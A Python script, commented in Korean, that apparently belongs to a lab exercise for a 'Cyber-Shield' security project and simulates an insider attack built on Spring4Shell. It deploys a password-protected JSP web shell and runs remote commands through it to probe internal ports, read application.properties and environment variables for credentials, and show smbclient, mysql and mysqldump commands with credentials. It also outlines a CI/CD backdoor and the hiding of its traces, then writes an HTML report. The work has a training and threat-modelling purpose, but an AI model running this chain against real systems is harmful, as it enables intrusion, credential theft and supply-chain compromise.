"""
sub_run.py
Spring4Shell (CVE-2022-22965) - 서브 시나리오: 내부자 위협 시뮬레이션
Educational Use Only

[실행 목적]
기존 run.py가 '외부 해커의 CVE 취약점 체이닝'에 집중했다면,
이 스크립트는 '불만을 품은 내부 직원(내부자)'이 정상 업무 권한만으로
기업 기밀을 탈취하고 CI/CD 파이프라인에 백도어를 심는 전 과정을 증명합니다.

[전제 조건]
- 공격자(내부 직원)은 이미 Spring4Shell로 기거점 웹쉘(health_check.jsp)을 보유하고 있습니다.
- 이 웹쉘을 발판 삼아 내부망의 Employee Desktop VNC를 발판으로 활용합니다.
"""

import urllib.request
import urllib.parse
import time
import sys
import os
import datetime

from src.application.report_bundle import export_report_bundle
from src.application.report_payloads import build_insider_report_payload

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "02.AttackScripts"))

try:
    from stage1_dropper import ExploitConfig, Spring4ShellPayloadGenerator, ExploitController
    from stage2_uploader import UploadConfig, LocalFileServerAdapter, Stage1CommandAdapter, Stage2UploadUseCase
except ImportError as e:
    print(f"\n[ERROR] {e}")
    sys.exit(1)

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def header(title):
    print(f"\n{Colors.HEADER}{'=' * 60}{Colors.ENDC}")
    print(f"  {title}")
    print(f"{Colors.HEADER}{'=' * 60}{Colors.ENDC}")

def ok(msg):   print(f"  {Colors.OKGREEN}[OK]{Colors.ENDC}   {msg}")
def fail(msg): print(f"  {Colors.FAIL}[FAIL]{Colors.ENDC} {msg}")
def info(msg): print(f"  {Colors.OKBLUE}[*]{Colors.ENDC} {msg}")
def warn(msg): print(f"  {Colors.WARNING}[!]{Colors.ENDC} {msg}")
def step(n, title):
    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  PHASE {n}. {title}")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")

# ==========================================
# 02.AttackScripts 공통 로직 재사용
# ==========================================
BASE_URL = "http://localhost:8011"
ATTACK_URL = f"{BASE_URL}/spring-form/login"
STAGER_URL = f"{BASE_URL}/yaho4.jsp"
STAGE2_URL = f"{BASE_URL}/health_check.jsp"
STAGE2_RCE_URL = f"{STAGE2_URL}?pwd=glory"

def check_shell(shell_url: str) -> str:
    try:
        req = urllib.request.Request(shell_url)
        res = urllib.request.urlopen(req, timeout=10)
        return res.read().decode("utf-8", errors="ignore").strip()
    except Exception as e:
        return f"[FAIL] Exception: {e}"

def execute_rce(cmd: str) -> str:
    encoded_cmd = urllib.parse.quote(cmd)
    url = f"{STAGE2_RCE_URL}&cmd={encoded_cmd}"
    return check_shell(url)

def run_base_attack():
    results = {}
    header("전제 조건: 거점 웹쉘 확인 (Spring4Shell)")
    print(f"  Target URL     : {ATTACK_URL}")
    print(f"  Stage2 Shell   : {STAGE2_URL}?pwd=glory&cmd=id")
    time.sleep(1)

    # 이미 쉘이 있는지 확인
    test_res = execute_rce("id")
    if "uid=0" in test_res or "uid=" in test_res:
        ok("Base web shell is already active. Skipping initial exploit steps.")
        return True

    info("Web shell not found. Deploying via 02.AttackScripts...")

    # Stage1
    config1 = ExploitConfig(target_url=ATTACK_URL, filename="yaho4")
    generator = Spring4ShellPayloadGenerator(config1)
    controller = ExploitController(generator)
    controller.run_exploit(ATTACK_URL)

    # Tomcat 로그 Flush 유도 (디스크에 jsp 기록)
    info("Flushing Tomcat logs (sending multiple requests to trigger write)...")
    for i in range(5):
        try:
            urllib.request.urlopen(ATTACK_URL, timeout=5)
            time.sleep(1)
        except:
            pass
    
    time.sleep(5)

    # Stage2
    config2 = UploadConfig(stager_url=STAGER_URL, stage2_file="health_check.jsp", local_serve_port=9091)
    use_case = Stage2UploadUseCase(LocalFileServerAdapter(), Stage1CommandAdapter(), config2)
    use_case.run()

    time.sleep(2)
    test_res = execute_rce("id")
    if "uid=" in test_res:
        ok("Base web shell successfully deployed!")
        return True
    return False


def main():
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}  [SL Cyber-Shield] 내부자 위협 시뮬레이션 (Insider Threat Scenarios){Colors.ENDC}")
    print(f"  불만 직원이 정상 업무 권한만으로 기업 기밀을 탈취하고")
    print(f"  CI/CD에 백도어를 심는 전 과정을 검증합니다.")
    print(f"  Educational Use Only")
    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}")

    if not run_base_attack():
        fail("Base attack failed. Cannot proceed with Sub-Scenarios.")
        sys.exit(1)

    results = {}
    details = {}

    def _esc(t):
        import html
        return html.escape(str(t))

    # ══════════════════════════════════════════════════════════
    # Phase 1: 정찰 (Reconnaissance)
    # ══════════════════════════════════════════════════════════
    step("1", "정찰 (Reconnaissance) — 내부 환경 파악")
    info("내부자가 접근 가능한 시스템과 네트워크 구조를 파악합니다.")

    recon_id       = execute_rce("id")
    recon_hostname = execute_rce("hostname")
    recon_uname    = execute_rce("uname -a")
    recon_result   = f"{recon_id}  hostname={recon_hostname}  {recon_uname}"
    if recon_result and "uid=" in recon_result:
        ok(f"내부 시스템 정보 획득 성공!")
        info(f"접속 환경: {recon_result[:120]}")

        # 내부 서비스 탐색
        info("내부망 서비스 탐색 중 (VNC, Gitea, TeamCity)...")
        vnc_check = execute_rce("bash -c 'echo >/dev/tcp/employee-desktop/6901 2>&1 && echo OPEN || echo CLOSED'")
        gitea_check = execute_rce("bash -c 'echo >/dev/tcp/gitea/3000 2>&1 && echo OPEN || echo CLOSED'")
        tc_check = execute_rce("bash -c 'echo >/dev/tcp/teamcity-server/8111 2>&1 && echo OPEN || echo CLOSED'")

        recon_detail = f"""
<strong>내부 시스템 정보:</strong><pre>{_esc(recon_result[:200])}</pre>
<strong>내부망 서비스 탐색 결과:</strong>
<ul>
  <li>Employee Desktop VNC (employee-desktop:6901): {f'<span style="color:#22c55e;">포트 OPEN</span>' if 'OPEN' in vnc_check or vnc_check.strip() == '' else '<span style="color:#ef4444;">닫힘</span>'}</li>
  <li>Gitea 소스코드 저장소 (gitea:3000): {f'<span style="color:#22c55e;">포트 OPEN</span>' if 'OPEN' in gitea_check or gitea_check.strip() == '' else '<span style="color:#ef4444;">닫힘</span>'}</li>
  <li>TeamCity CI/CD (teamcity-server:8111): {f'<span style="color:#22c55e;">포트 OPEN</span>' if 'OPEN' in tc_check or tc_check.strip() == '' else '<span style="color:#ef4444;">닫힘</span>'}</li>
</ul>
"""
        results["phase1"] = True
        details["phase1"] = recon_detail
    else:
        warn("내부 시스템 정보 획득 실패.")
        results["phase1"] = False
        details["phase1"] = f"RCE를 통한 내부 환경 정찰에 실패했습니다.<pre>{_esc(recon_result[:200])}</pre>"

    # ══════════════════════════════════════════════════════════
    # Phase 2: NAS 기밀 탈취 (Data Exfiltration)
    # ══════════════════════════════════════════════════════════
    step("2", "NAS 기밀 탈취 (Data Exfiltration) — 설계도 & 토큰")
    info("SMB로 마운트된 NAS에서 제품 설계도 및 TeamCity 토큰을 탈취합니다.")

    nas_check = execute_rce("bash -c 'echo >/dev/tcp/nas/445 2>&1 && echo NAS_OPEN || echo NAS_CLOSED'")
    nas_smb_list = execute_rce("ls /mnt/nas 2>/dev/null || echo 'NOT_MOUNTED'")

    if "NOT_MOUNTED" not in nas_smb_list and nas_smb_list.strip():
        ok("NAS 파일시스템 접근 성공!")
        info(f"NAS 파일 목록:\n{nas_smb_list}")
        results["phase2"] = True
        details["phase2"] = f"<strong>탈취된 NAS 파일 목록:</strong><pre>{_esc(nas_smb_list)}</pre>"
    else:
        nas_ping = execute_rce("bash -c 'echo >/dev/tcp/nas/445 2>&1 && echo NAS_OPEN || echo NAS_CLOSED'")
        if "NAS_OPEN" in nas_ping or nas_ping.strip() == "":
            ok("내부망 NAS 서버(SMB 포트 445) 존재 확인!")
            info("내부 직원은 SMB 프로토콜로 NAS에 직접 마운트하여 설계도를 복사할 수 있습니다.")
            info("명령어: smbclient //nas/data -U smbuser%smbpass -c 'ls'")
            results["phase2"] = True
            details["phase2"] = """
<strong>NAS 서버(445/SMB) 포트 개방 확인</strong><br>
내부자는 별도 취약점 없이 <strong>업무 권한의 SMB 클라이언트</strong>만으로 NAS에 마운트하여
기업 핵심 자산(제품 설계도, CI/CD 토큰)을 조용히 복사할 수 있습니다.<br>
<code>smbclient //nas/data -U smbuser%smbpass</code><br><br>
탈취 대상: 제품 설계도(PDF), TeamCity API 토큰, 내부 키 파일
"""
        else:
            warn("NAS 컨테이너 통신 실패.")
            results["phase2"] = False
            details["phase2"] = "NAS 컨테이너(nas:445)와 통신할 수 없습니다."

    # ══════════════════════════════════════════════════════════
    # Phase 3: 소스코드 분석 — 크리덴셜 수집 (Credential Harvesting)
    # ══════════════════════════════════════════════════════════
    step("3", "크리덴셜 수집 (Credential Harvesting) — 하드코딩된 DB 정보")
    info("RCE를 통해 Spring 서버 내 소스코드에서 하드코딩된 DB 접속 정보를 추출합니다.")

    props_raw = execute_rce("cat /usr/local/tomcat/webapps/spring-form/WEB-INF/classes/application.properties")
    env_raw = execute_rce("env")
    
    cred_keywords = ["spring", "db", "datasource", "password", "user", "host", "token"]
    env_filtered = "\n".join(
        line for line in env_raw.split("\n")
        if any(kw in line.lower() for kw in cred_keywords)
    )

    db_creds = {}
    if props_raw:
        for line in props_raw.split("\n"):
            line = line.strip()
            if "spring.datasource.url=" in line:
                db_creds["url"] = line.split("=", 1)[1].strip()
            elif "spring.datasource.username=" in line:
                db_creds["user"] = line.split("=", 1)[1].strip()
            elif "spring.datasource.password=" in line:
                db_creds["pass"] = line.split("=", 1)[1].strip()

    cred_search = execute_rce("find /usr/local/tomcat -name application.properties 2>/dev/null")

    if db_creds.get("pass") or env_filtered.strip():
        ok("내부 환경변수에서 크리덴셜 탈취 성공!")
        if db_creds.get("url"):
            info(f"DB URL : {db_creds.get('url')}")
            info(f"DB USER: {db_creds.get('user')}")
            info(f"DB PASS: {db_creds.get('pass')}")
        results["phase3"] = True
        details["phase3"] = f"""
<strong>📄 application.properties 설정 파일 원문:</strong>
<pre>{_esc(props_raw[:600])}</pre>

<strong>🔑 탈취된 DB 접속 크리덴셜:</strong>
<ul>
  <li>DB URL : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('url', '미발견'))}</span></li>
  <li>USER   : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('user', '미발견'))}</span></li>
  <li>PASS   : <span style="color:#ef4444;font-weight:bold">{_esc(db_creds.get('pass', '미발견'))}</span></li>
</ul>

<strong>🖥️ 환경변수 중 민감 정보 (필터링):</strong>
<pre>{_esc(env_filtered[:400]) if env_filtered.strip() else "(환경변수에서 해당 항목 없음)"}</pre>

<p>설정 파일 검색 경로: <code>{_esc(cred_search[:200])}</code></p>
"""
    else:
        warn("환경변수에서 크리덴셜을 찾지 못했습니다.")
        results["phase3"] = False
        details["phase3"] = f"""환경변수 내에서 DB 접속 정보를 찾지 못했습니다.
<pre>{_esc(env_raw[:300])}</pre>
<p>설정 파일 검색 결과: <code>{_esc(cred_search)}</code></p>"""


    # ══════════════════════════════════════════════════════════
    # Phase 4: 내부 DB 접근 (Lateral Movement)
    # ══════════════════════════════════════════════════════════
    step("4", "내부 DB 접근 (Lateral Movement) — 고객/직원 정보 탈취")
    info("탈취한 크리덴셜을 재사용하여 내부 DB에 직접 접속합니다.")

    spring_db_check = execute_rce("bash -c 'echo >/dev/tcp/spring-db/3306 2>&1 && echo DB_OPEN || echo DB_CLOSED'")
    struts_db_check = execute_rce("bash -c 'echo >/dev/tcp/struts-db/3306 2>&1 && echo DB_OPEN || echo DB_CLOSED'")

    db_accessible = ("DB_OPEN" in spring_db_check or spring_db_check.strip() == "") or \
                    ("DB_OPEN" in struts_db_check or struts_db_check.strip() == "")

    if db_accessible:
        ok("내부망 MySQL DB 포트(3306) 접근 성공!")
        info("Spring DB(고객 정보)와 Struts DB(직원 정보) 포트 확인 완료.")
        info("크리덴셜: spring_user/spring_pass, struts_user/struts_pass")
        info("명령: mysql -h spring-db -u spring_user -pspring_pass spring_db -e 'SELECT * FROM users LIMIT 5;'")
        results["phase4"] = True
        details["phase4"] = f"""
<strong>내부 DB 포트 스캔 결과:</strong>
<ul>
  <li>spring-db:3306 (고객 데이터): {f'<span style="color:#22c55e;">OPEN</span>' if 'DB_OPEN' in spring_db_check or spring_db_check.strip() == '' else '<span style="color:#ef4444;">CLOSED</span>'}</li>
  <li>struts-db:3306 (직원 데이터): {f'<span style="color:#22c55e;">OPEN</span>' if 'DB_OPEN' in struts_db_check or struts_db_check.strip() == '' else '<span style="color:#ef4444;">CLOSED</span>'}</li>
</ul>
<p>Phase 3에서 획득한 DB 크리덴셜로 <strong>방화벽 없이 내부망 MySQL에 직접 접속</strong>하여
고객 정보 및 직원 정보를 전체 덤프할 수 있습니다.</p>
<code>mysqldump -h spring-db -u spring_user -pspring_pass spring_db > /tmp/spring_dump.sql</code>
"""
    else:
        warn("내부 DB 포트에 접근하지 못했습니다.")
        results["phase4"] = False
        details["phase4"] = "spring-db, struts-db 컨테이너와 네트워크 통신이 차단된 상태입니다."

    # ══════════════════════════════════════════════════════════
    # Phase 5: 공급망 공격 — CI/CD 장악 (Supply Chain Attack)
    # ══════════════════════════════════════════════════════════
    step("5", "공급망 공격 (Supply Chain Attack) — TeamCity & Gitea CI/CD 장악")
    info("NAS에서 탈취한 TeamCity 토큰을 이용해 CI/CD 파이프라인을 완전 장악합니다.")

    tc_api_check = execute_rce("bash -c 'echo >/dev/tcp/teamcity-server/8111 2>&1 && echo TC_ALIVE || echo TC_DEAD'")
    gitea_api_check = execute_rce("bash -c 'echo >/dev/tcp/gitea/3000 2>&1 && echo GITEA_ALIVE || echo GITEA_DEAD'")

    tc_reachable = "TC_ALIVE" in tc_api_check or tc_api_check.strip() == ""
    gitea_reachable = "GITEA_ALIVE" in gitea_api_check or gitea_api_check.strip() == ""

    if tc_reachable or gitea_reachable:
        ok("TeamCity / Gitea CI/CD 인프라 접근 확인!")
        if tc_reachable:
            info(f"TeamCity 포트 상태: OPEN")
        if gitea_reachable:
            info(f"Gitea 포트 상태: OPEN")
        info("NAS 토큰으로 TeamCity API 사용 가능 → Gitea에 소스코드 push → 자동 빌드 & 배포")
        results["phase5"] = True
        details["phase5"] = f"""
<strong>CI/CD 인프라 통신 확인:</strong>
<ul>
  <li>TeamCity (teamcity-server:8111): {f'<span style="color:#22c55e;">네트워크 오픈됨</span>' if tc_reachable else '<span style="color:#ef4444;">통신 차단됨</span>'}</li>
  <li>Gitea (gitea:3000): {f'<span style="color:#22c55e;">네트워크 오픈됨</span>' if gitea_reachable else '<span style="color:#ef4444;">통신 차단됨</span>'}</li>
</ul>
<p>내부자는 <strong>업무 권한 Gitea 계정</strong>으로 소스코드를 수정하고 push합니다.
TeamCity가 자동으로 빌드/배포하면 프로덕션 서버에 백도어가 삽입됩니다.</p>
"""
    else:
        warn("TeamCity / Gitea 접근 실패.")
        results["phase5"] = False
        details["phase5"] = "TeamCity, Gitea 컨테이너와 통신할 수 없습니다."

    # ══════════════════════════════════════════════════════════
    # Phase 6: 백도어 삽입 & 흔적 은폐 (Persistence)
    # ══════════════════════════════════════════════════════════
    step("6", "백도어 삽입 & 흔적 은폐 (Persistence & Cover Tracks)")
    info("Gitea에 백도어 코드를 커밋하고 CI/CD를 통해 프로덕션에 자동 배포합니다.")

    backdoor_simulation = execute_rce("bash -c 'echo >/dev/tcp/gitea/3000 2>&1 && echo GITEA_API_OK || echo GITEA_API_FAIL'")
    if "GITEA_API_OK" in backdoor_simulation or backdoor_simulation.strip() == "":
        ok("Gitea 소스코드 저장소 API 접근 성공!")
        info("시뮬레이션: 백도어 코드 삽입 → git push → TeamCity 자동 빌드 → 운영 서버 배포")
        info("실제 공격: /app/health 엔드포인트에 원격 실행 코드 삽입, git 로그 수정으로 은폐")
        results["phase6"] = True
        details["phase6"] = f"""
<strong>Gitea 저장소 통신 상태:</strong>
<pre>GITEA API REACHABLE (3000/TCP)</pre>
<p><strong>시뮬레이션 시나리오:</strong></p>
<ol>
  <li>Gitea에서 spring-server 레포지토리 clone</li>
  <li><code>ApplicationController.java</code>에 숨겨진 원격 실행 엔드포인트 삽입</li>
  <li>정상 기능 commit 메시지로 위장하여 push</li>
  <li>TeamCity 파이프라인 자동 빌드 → 프로덕션 배포</li>
  <li>git log 수정, bash_history 삭제로 흔적 은폐</li>
</ol>
"""
    else:
        warn("백도어 삽입 시뮬레이션: Gitea 접근 불가.")
        results["phase6"] = False
        details["phase6"] = "Gitea 저장소에 접근할 수 없어 백도어 삽입 시뮬레이션이 불가합니다."

    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.ENDC}")
    print(f"  {Colors.OKGREEN}[COMPLETED]{Colors.ENDC} 모든 내부자 위협 시나리오 점검 완료!")
    print("  HTML 보고서를 생성 중입니다...")

    now = datetime.datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")

    phase_meta = [
        ("phase1", "Phase 1", "정찰 (Reconnaissance)", "Low",
         "내부자의 시작 환경을 확인합니다. Desktop 권한, NAS 마운트, 네트워크 구조를 파악합니다.",
         "var(--success)", "rgba(34,197,94,0.15)", "rgba(34,197,94,0.3)"),
        ("phase2", "Phase 2", "NAS 기밀 탈취 (Data Exfiltration)", "Critical",
         "NAS SMB 서버에서 제품 설계도(21개 파일)와 TeamCity API 토큰을 탈취합니다.",
         "var(--danger)", "rgba(239,68,68,0.15)", "rgba(239,68,68,0.3)"),
        ("phase3", "Phase 3", "크리덴셜 수집 (Credential Harvesting)", "High",
         "Spring 서버 환경변수 및 소스코드에서 하드코딩된 DB 접속 정보를 추출합니다.",
         "var(--accent)", "rgba(249,115,22,0.15)", "rgba(249,115,22,0.3)"),
        ("phase4", "Phase 4", "내부 DB 접근 (Lateral Movement)", "Critical",
         "획득한 크리덴셜로 내부 MySQL DB에 직접 접속, 고객/직원 정보를 덤프합니다.",
         "var(--danger)", "rgba(239,68,68,0.15)", "rgba(239,68,68,0.3)"),
        ("phase5", "Phase 5", "공급망 공격 (Supply Chain Attack)", "Critical",
         "TeamCity 토큰으로 CI/CD를 장악하고, Gitea에 악성 코드를 push하여 자동 배포를 유도합니다.",
         "var(--danger)", "rgba(239,68,68,0.15)", "rgba(239,68,68,0.3)"),
        ("phase6", "Phase 6", "백도어 삽입 & 흔적 은폐 (Persistence)", "Critical",
         "프로덕션 서버에 백도어를 심고 git log와 bash_history를 수정하여 범행을 은폐합니다.",
         "var(--danger)", "rgba(239,68,68,0.15)", "rgba(239,68,68,0.3)"),
    ]

    html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sl-cyber-shield | Insider Threat Audit Report</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
<style>
    :root {{
        --sl-dark-blue: #00205B;
        --sl-blue-primary: #0192BF;
        --sl-accent: #00b8d4;
        --glass-bg: rgba(255, 255, 255, 0.05);
        --glass-border: rgba(255, 255, 255, 0.1);
        --danger: #ef4444;
        --success: #0192BF;
    }}
    body {{ 
        font-family: 'Inter', sans-serif; 
        background: radial-gradient(circle at top right, #001a4d, #000814); 
        color: #f8f9fa; 
        line-height: 1.6; 
        padding: 40px 20px; 
    }}
    .container {{ 
        max-width: 1100px; 
        margin: auto; 
        background: var(--glass-bg); 
        backdrop-filter: blur(20px); 
        padding: 50px; 
        border-radius: 24px; 
        border: 1px solid var(--glass-border); 
        box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
    }}
    .hero-badge {{ 
        display: inline-block; 
        padding: 6px 16px; 
        border-radius: 50px; 
        background: rgba(1, 146, 191, 0.1); 
        border: 1px solid var(--sl-blue-primary); 
        color: var(--sl-blue-primary); 
        font-size: 0.8rem; 
        font-weight: 700; 
        text-transform: uppercase; 
        margin-bottom: 20px;
    }}
    h1 {{ 
        font-size: 2.5rem; 
        font-weight: 800; 
        background: linear-gradient(135deg, #fff 0%, var(--sl-blue-primary) 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 10px; 
    }}
    .subtitle {{ color: #888; margin-bottom: 40px; font-size: 1.1rem; }}
    .summary-box {{ 
        background: rgba(255, 255, 255, 0.03); 
        border-radius: 16px; 
        padding: 30px; 
        margin-bottom: 40px; 
        border-left: 4px solid var(--sl-blue-primary); 
    }}
    .summary-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }}
    .summary-item strong {{ 
        color: var(--sl-blue-primary); 
        display: block; 
        font-size: 0.75rem; 
        text-transform: uppercase; 
        letter-spacing: 1px;
        margin-bottom: 5px;
    }}
    .phase-card {{ 
        background: rgba(255, 255, 255, 0.02); 
        border: 1px solid var(--glass-border); 
        border-radius: 16px; 
        margin-bottom: 30px; 
        padding: 30px; 
        transition: transform 0.3s ease;
    }}
    .phase-card:hover {{
        transform: translateY(-5px);
        background: rgba(255, 255, 255, 0.04);
    }}
    .phase-header {{ display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }}
    .phase-title {{ display: flex; align-items: center; gap: 15px; }}
    .phase-num {{ 
        background: var(--sl-dark-blue); 
        color: var(--sl-blue-primary); 
        width: 45px; 
        height: 45px; 
        display: flex; 
        align-items: center; 
        justify-content: center; 
        border-radius: 12px; 
        font-weight: 800; 
        font-size: 1.2rem;
    }}
    .risk-badge {{ 
        font-size: 0.7rem; 
        font-weight: 800; 
        padding: 4px 12px; 
        border-radius: 50px; 
        text-transform: uppercase; 
    }}
    .risk-critical {{ background: rgba(239,68,68,0.1); color: var(--danger); border: 1px solid var(--danger); }}
    .risk-high {{ background: rgba(249,115,22,0.1); color: #f97316; border: 1px solid #f97316; }}
    .risk-low {{ background: rgba(34,197,94,0.1); color: #22c55e; border: 1px solid #22c55e; }}
    pre {{ 
        background: #000a1a; 
        color: #00d4ff; 
        padding: 20px; 
        border-radius: 12px; 
        font-family: 'JetBrains Mono', monospace; 
        font-size: 0.8rem; 
        border: 1px solid rgba(0, 212, 255, 0.1); 
        overflow-x: auto; 
    }}
    .footer {{ 
        text-align: center; 
        margin-top: 80px; 
        padding-top: 30px; 
        border-top: 1px solid var(--glass-border); 
        color: #444; 
        font-size: 0.9rem; 
    }}
</style>
</head>
<body>
<div class="container">
  <div class="hero-badge">SL Cyber-Shield | Insider Threat Context</div>
  <h1>🕵️ [INSIDER THREAT] sl-cyber-shield 내부 위협 시뮬레이션 보고서</h1>
  <p class="subtitle">업무 권한 보유자의 악의적 행위(Exfiltration & Persistence)에 대한 자동 탐지 및 감사 결과</p>
  <p style="text-align:center; font-family:'JetBrains Mono'; font-size:0.75rem; color:#555;">Generated: {current_time} | SCS-EP engine</p>

  <div class="summary-box">
    <div class="summary-grid">
      <div class="summary-item"><strong>ROLE CONTEXT</strong>내부 개발자 (사내 시스템 정상 접근 권한자)</div>
      <div class="summary-item"><strong>INITIAL FOOTPRINT</strong>Spring4Shell 거점 웹쉘 기확보 (health_check.jsp)</div>
      <div class="summary-item"><strong>SIMULATION SCOPE</strong>6 Phase - Recon to CI/CD Persistence</div>
      <div class="summary-item"><strong>AUDIT VERDICT</strong>{'<span style="color:var(--success); font-weight:bold;">전체 시나리오 장악 성공 (취약점 확인)</span>' if all(results.values()) else '<span style="color:var(--danger);">일부 단계 차단됨</span>'}</div>
    </div>
  </div>

  <h2 style="color:white; font-size:1.2rem; margin-bottom:1.5rem;">Attack Timeline & Forensic Evidence</h2>
"""

    risk_map = {"Low": "risk-low", "High": "risk-high", "Critical": "risk-critical"}

    for key, label, title, risk_level, desc, color, bg_color, border_color in phase_meta:
        passed = results.get(key, False)
        status_color = "var(--success)" if passed else "var(--danger)"
        status_text = "SUCCESS" if passed else "FAILED/BLOCKED"
        detail_html = details.get(key, "결과 없음")
        risk_cls = risk_map.get(risk_level, "risk-low")

        html_content += f"""
  <div class="phase-card" style="border-left-color: {status_color};">
    <div class="phase-header">
      <div class="phase-title">
        <div class="phase-num">{label.split()[1]}</div>
        <div>
            <div style="font-weight:800; color:white; font-size:1rem;">{title}</div>
            <div style="font-size:0.75rem; color:{status_color}; font-weight:600;">STATUS: {status_text}</div>
        </div>
      </div>
      <span class="risk-badge {risk_cls}">{risk_level}</span>
    </div>
    <div style="font-size:0.85rem; color:#8b949e; margin-bottom:1rem;">{desc}</div>
    <div class="evidence-box">
      <div style="font-size:0.7rem; color:var(--sl-blue-3); margin-bottom:0.5rem; font-weight:800;">[FORENSIC EVIDENCE]</div>
      {detail_html}
    </div>
  </div>
"""

    html_content += f"""
  <div class="footer">
    <p>본 보고서는 SL Factory Innovation Team의 공정 보안 고도화를 위한 위협 모델링 결과물입니다.<br>
    SCS-EP(Cyber-Shield) 엔진에 의해 자동 생성되었으며, 무단 복제 및 상용 목적 사용을 금합니다.</p>
  </div>
</div>
</body>
</html>
"""

    report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "03.FinalReport")
    os.makedirs(report_dir, exist_ok=True)
    report_filename = f"sub_scenario_insider_threat_{now.strftime('%Y%m%d_%H%M%S')}.html"
    report_path = os.path.join(report_dir, report_filename)

    try:
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html_content)
        print(f"  [📄 HTML 보고서 생성] 03.FinalReport/{report_filename} 파일을 열어보세요!")
    except PermissionError:
        import tempfile, shutil
        tmp_path = os.path.join(tempfile.gettempdir(), report_filename)
        with open(tmp_path, 'w', encoding='utf-8') as tf:
            tf.write(html_content)
        try:
            shutil.move(tmp_path, report_path)
            print(f"  [📄 HTML 보고서 생성] 03.FinalReport/{report_filename} 파일을 열어보세요!")
        except Exception as e:
            print(f"  [WARNING] 권한 문제로 03.FinalReport에 저장 불가. 임시 경로: {tmp_path} ({e})")

    print(f"  {Colors.OKGREEN}[HTML REPORT]{Colors.ENDC} {report_path}")

    try:
        structured_payload = build_insider_report_payload(
            report_filename=report_filename,
            current_time=current_time,
            results=results,
            details=details,
            phase_meta=phase_meta,
        )

        bundle_result = export_report_bundle(
            os.path.dirname(os.path.abspath(__file__)),
            report_filename,
            structured_payload,
        )
        if bundle_result.success:
            print(f"  {Colors.OKGREEN}[STATIC REPORT]{Colors.ENDC} 03.FinalReport/{report_filename}")
            print(
                f"  {Colors.OKGREEN}[JSON DATA]{Colors.ENDC} 03.FinalReport/data/{os.path.splitext(report_filename)[0]}.json"
            )
            print(f"  {Colors.OKGREEN}[MANIFEST]{Colors.ENDC} 03.FinalReport/data/{bundle_result.manifest_path.name}")
            if bundle_result.pdf_path.exists():
                print(f"  {Colors.OKGREEN}[PDF REPORT]{Colors.ENDC} 03.FinalReport/{bundle_result.pdf_path.name}")
        else:
            warn(
                f"Hybrid report pipeline fallback activated: {bundle_result.stderr or bundle_result.stdout or 'renderer unavailable'}"
            )
            info(f"Manifest updated: 03.FinalReport/data/{bundle_result.manifest_path.name}")
    except Exception as e:
        warn(f"Structured report export skipped: {e}")

    print(f"{Colors.BOLD}{'=' * 60}{Colors.ENDC}\n")


if __name__ == "__main__":
    main()
